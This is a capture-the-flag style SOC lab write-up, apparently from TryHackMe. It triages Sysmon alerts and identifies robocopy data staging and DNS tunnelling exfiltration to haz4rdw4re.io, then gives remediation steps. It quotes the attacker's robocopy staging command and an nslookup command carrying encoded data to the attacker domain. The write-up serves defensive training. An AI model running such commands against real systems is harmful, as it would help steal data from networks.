# TryHackMe – SOC Simulator Investigation

## Overview

This project documents the investigation performed in the **TryHackMe SOC Simulator** lab.
The goal of the lab is to analyze alerts generated by a SIEM platform and determine whether they are **False Positives or True Positives**, identify **malicious activity**, and provide **incident response recommendations**.

During the investigation, multiple alerts were analyzed using **Sysmon logs**, focusing on process creation events and suspicious parent-child relationships.

The analysis revealed a **multi-stage attack involving reconnaissance, data staging, and DNS-based data exfiltration**.

# Step 1 – Suspicious Process Creation

Alert:

```
taskhostw.exe
Parent: svchost.exe
Command: taskhostw.exe KEYROAMING
```

### Analysis

This process relationship is sometimes seen in normal Windows activity.
However, due to the context of later alerts, this event was monitored as part of the investigation.

### Classification

False Positive (Low Risk)

---

# Step 2 – Data Staging Using Robocopy

Alert:

```
Process: Robocopy.exe
Parent: powershell.exe

Command:
Robocopy.exe . C:\Users\michael.ascot\downloads\exfiltration /E
```

### Analysis

Robocopy is a legitimate Windows tool used for copying files.
However, it was executed via **PowerShell** to copy files into a directory named:

```
Downloads\exfiltration
```

This strongly indicates **data staging before exfiltration**.

### Classification

True Positive

---

# Step 3 – DNS-Based Data Exfiltration

Multiple alerts showed the following pattern:

```
Parent Process: powershell.exe
Child Process: nslookup.exe
Domain: haz4rdw4re.io
```

Example command:

```
"C:\Windows\system32\nslookup.exe" VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm.haz4rdw4re.io
```

### Analysis

The DNS queries contain **encoded data inside the subdomain**.

Example:

```
VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm
```

This is **Base64 encoded data**, commonly used in **DNS tunneling attacks**.

The attacker sends pieces of data through DNS queries to an external domain controlled by the attacker:

```
haz4rdw4re.io
```

This technique allows attackers to bypass traditional network monitoring.

### Classification

True Positive

# Remediation Actions

Recommended incident response steps:

1. Immediately **isolate the affected host from the network**.
2. Block the malicious domain:

```
haz4rdw4re.io
```

3. Terminate suspicious PowerShell processes.
4. Perform **endpoint forensic analysis**.
5. Reset credentials for the affected user.
6. Review DNS logs across the environment.
7. Implement DNS monitoring for tunneling detection.

# Conclusion

The SOC investigation confirmed a **data exfiltration attack using DNS tunneling**.
Attackers leveraged built-in Windows utilities such as **PowerShell, Robocopy, and nslookup** to stage and exfiltrate data while attempting to evade detection.

Proper monitoring of **process relationships, encoded DNS queries, and unusual command-line activity** is critical for detecting these types of attacks.
